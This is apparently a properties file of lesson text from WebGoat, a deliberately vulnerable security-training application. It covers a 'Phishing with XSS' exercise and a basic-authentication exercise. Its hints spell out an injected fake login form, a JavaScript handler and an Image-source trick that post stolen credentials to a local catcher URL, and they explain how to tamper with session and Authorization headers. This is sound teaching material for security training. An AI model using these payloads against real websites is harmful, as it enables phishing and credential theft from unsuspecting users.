PhishingTitle=Phishing with XSS
PhishingInstructions=This lesson is an example of how a website might support a phishing attack if there is a known XSS attack on the page<BR><BR>Below is an example of a standard search feature.<br>Using XSS and HTML insertion, your goal is to: <UL> <LI>Insert html to that requests credentials <LI>Add javascript to actually collect the credentials <LI>Post the credentials to http://localhost:8080/WebGoat/catcher?PROPERTY=yes&userText=___&passText=___</UL> To pass this lesson, the credentials must be posted to the catcher servlet.<BR>
PhishingHint1=Try adding HTML to the search field to create a fake authentication form, since the form is vulnerable to XSS.<BR> Try to make the form look official.
PhishingHint2=Try: <BR> &lt;form name=&quot;phish&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;&lt;H3&gt;This feature requires account login:&lt;/H2&gt;&lt;br&gt;&lt;br&gt;Enter Username:&lt;br&gt;&lt;input type=&quot;text&quot; name=&quot;userText&quot;&gt;&lt;br&gt;Enter Password:&lt;br&gt;&lt;input type=&quot;password&quot; name = &quot;passText&quot;&gt;&lt;br&gt;&lt;/form&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;
PhishingHint3=Add functionality that can post a request, a button might work<BR><BR>After getting the button on the page, don't forget you will need to steal the credentials and post them to: <BR>http://localhost:8080/WebGoat/catcher?PROPERTY=yes&ADD_CREDENTIALS_HERE
PhishingHint4=Try: <BR> &lt;input type=&quot;submit&quot; name=&quot;login&quot; value=&quot;login&quot; onclick=&quot;hack()&quot;&gt;<BR><BR>Also, check firebug. Does the search form need to be terminated for this to work...? (&lt;/form&gt;)
PhishingHint5=You will need to create a javascript function that is triggered when the form is submitted.  This function will pull the credentials from the webpage and post them to the WebGoat catcher servlet. <BR><BR> Some useful code snippets:<UL><LI>To access the user field:  document.phish.user.value <LI>To perform a post:  XssImage = new Image(); XssImage.src=SOME_URL<LI>Javascript string concatentation uses a \"+\" </UL>

BasicAuthenticationGreenStars2= to get your green stars back.
BasicAuthenticationStage1Completed=Congratulations, you have figured out the mechanics of basic authentication.&nbsp;&nbsp;- Now you must try to make WebGoat reauthenticate you as:  &nbsp;&nbsp;&nbsp;&nbsp;- username:  basic &nbsp;&nbsp;&nbsp;&nbsp;- password:  basic. Use the Basic Authentication Menu to start at login page.
BasicAuthenticationAlmostThere1=You're almost there!  You've modified the 
BasicAuthenticationAlmostThere2= header but you are still logged in as 
BasicAuthenticationAlmostThere3=.  Look at the request after you typed in the 'basic' user credentials and submitted the request.  Remember the order of events that occur during Basic Authentication.
BasicAuthenticationReallyClose=You're really close!  Changing the session cookie caused the server to create a new session for you.  This did not cause the server to reauthenticate you. When you figure out how to force the server to perform an authentication request, you have to authenticate as:<br><br>&nbsp;&nbsp;&nbsp;&nbsp;user name: basic<br> &nbsp;&nbsp;&nbsp;&nbsp;password: basic<br>
BasicAuthenticationUseTheHints=Use the hints!  One at a time...
BasicAuthenticationHint1=Basic authentication uses a cookie to pass the credentials. Use a proxy to intercept the request.  Look at the cookies.
BasicAuthenticationHint2=Basic authentication uses Base64 encoding to 'scramble' the " + "user's login credentials.
BasicAuthenticationHint3=Basic authentication uses 'Authorization' as the cookie name to " + "store the user's credentials.
BasicAuthenticationHint4=Use WebScarab -> Tools -> Transcoder to Base64 decode the value in the Authorization cookie.
BasicAuthenticationHint5=Basic authentication uses a cookie to pass the credentials. Use a proxy to intercept the request.  Look at the cookies.
BasicAuthenticationHint6=Before the WebServer requests credentials from the client, the current session is checked for validitity.
BasicAuthenticationHint7=If the session is invalid the webserver will use the basic authentication credentials
BasicAuthenticationHint8=If the session is invalid and the basic authentication credentials are invalid, new credentials will be requested from the client.
BasicAuthenticationHint9=Intercept the request and corrupt the JSESSIONID and the Authorization header.
